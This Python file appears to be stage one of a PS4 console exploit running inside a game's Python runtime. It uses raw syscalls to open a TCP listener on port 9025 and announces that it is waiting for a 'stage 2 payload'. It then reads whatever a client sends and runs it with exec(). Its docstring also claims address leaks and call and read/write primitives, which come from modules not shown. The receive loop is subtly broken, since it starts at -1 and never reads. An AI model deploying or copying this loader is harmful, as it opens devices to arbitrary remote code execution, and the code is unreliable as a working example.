import struct
import traceback
from structure import Structure
from utils.etc import bytes
from utils.rp import log, log_exc
from utils.conversion import u64_to_i64
from constants import CONSOLE_KIND, rp
from errors.socket import SocketError
from sc import sc

"""
What it does:

1. leaks addresses of important functions / gadgets
2. builds a call primitive that can call any function with up to 6 args
3. provides basic read/write primitives

"""

PORT = 9025

#########
## PS4 ##
#########

STAGE2_MAX_SIZE = 4 * 1024 * 1024  # 4MB
STAGE2_BUF = bytes(b"\0" * STAGE2_MAX_SIZE)

AF_INET = 2
SOCK_STREAM = 1
SOL_SOCKET = 0xFFFF
SO_REUSEADDR = 4


sockaddr_in_struct = Structure(
    [
        ("sin_len", 1),
        ("sin_family", 1),
        ("sin_port", 2),
        ("sin_addr", 4),
        ("sin_zero", 8),
    ]
)
enable_buf_struct = Structure(
    [
        ("enable", 4),
    ]
)


def create_tcp_socket(sc):
    enable_buf = enable_buf_struct.create()
    enable_buf.enable = 1

    sockaddr_in = sockaddr_in_struct.create()
    sockaddr_in.sin_family = AF_INET
    sockaddr_in.sin_port = struct.unpack(">H", struct.pack("<H", PORT))[0]
    sockaddr_in.sin_addr = struct.unpack("<I", struct.pack(">I", 0))[0]  # INADDR_ANY

    s = u64_to_i64(sc.syscalls.socket(AF_INET, SOCK_STREAM))
    log("[*] Created TCP socket: %d" % s)
    if s < 0:
        raise SocketError(
            "socket failed with return value %d, error %d\n%s"
            % (s, sc.errno, sc.get_error_string())
        )

    sc.syscalls.setsockopt(
        s,
        SOL_SOCKET,
        SO_REUSEADDR,
        enable_buf,
        4,
    )
    log("[*] Set socket options: %d" % s)

    bind = u64_to_i64(sc.syscalls.bind(s, sockaddr_in, 16))
    log("[*] Bound socket: %d" % bind)
    if bind != 0:
        raise SocketError(
            "bind failed with return value %d, error %d\n%s"
            % (bind, sc.errno, sc.get_error_string())
        )

    listen = u64_to_i64(sc.syscalls.listen(s, 3))
    if listen != 0:
        raise SocketError(
            "listen failed with return value %d, error %d\n%s"
            % (listen, sc.errno, sc.get_error_string())
        )
    log("[*] Listening on socket: %d" % s)

    return s, sockaddr_in


def poc():
    log("[*] Detected console kind: %s, game name: %s" % (CONSOLE_KIND, rp.config.name))

    s = None
    port = None
    len_buf = Structure(
        [
            ("len", 4),
        ]
    ).create()
    log("[*] Creating TCP socket...")
    s, sockaddr_in = create_tcp_socket(sc)

    sc.syscalls.getsockname(
        s,
        sockaddr_in,
        len_buf,
    )
    port = struct.unpack(">H", struct.pack("<H", sockaddr_in.sin_port))[0]

    ip = sc.get_current_ip()

    if ip is None:
        msg = "Listening on port %d for stage 2 payload..." % port
        sc.send_notification(msg)
        log(msg)
    else:
        msg = "Listening on %s:%d for stage 2 payload..." % (ip, port)
        sc.send_notification(msg)
        log(msg)
    while True:
        log("Waiting for client connection...")
        client_sock = u64_to_i64(
            sc.syscalls.accept(
                s,
                sockaddr_in,
                len_buf,
            )
        )
        if client_sock < 0:
            raise SocketError(
                "accept failed with return value %d, error %d\n%s"
                % (
                    client_sock,
                    sc.syscalls.accept.errno,
                    sc.syscalls.accept.get_error_string(),
                )
            )

        log("Client connected on socket %d" % client_sock)

        read_size = -1
        stage2_str = ""
        while read_size > 0:
            read_size = u64_to_i64(
                sc.syscalls.read(
                    client_sock,
                    STAGE2_BUF,
                    STAGE2_MAX_SIZE,
                )
            )
            stage2_str += STAGE2_BUF[:read_size].decode("utf-8")
            if read_size < 0:
                raise SocketError(
                    "read failed with return value %d, error %d\n%s"
                    % (
                        read_size,
                        sc.syscalls.read.errno,
                        sc.syscalls.read.get_error_string(),
                    )
                )

        log("Received payload, executing...")

        sc.syscalls.close(client_sock)  # close client socket

        # Execute code, mimic file-exec by throwing local/global in same scope
        scope = dict(globals(), **locals())
        try:
            exec(stage2_str, scope)
            log("Payload executed successfully")
        except Exception as e:
            exc_msg = traceback.format_exc()
            log_exc(exc_msg)

    sc.syscalls.close(s)  # close listening socket


poc()
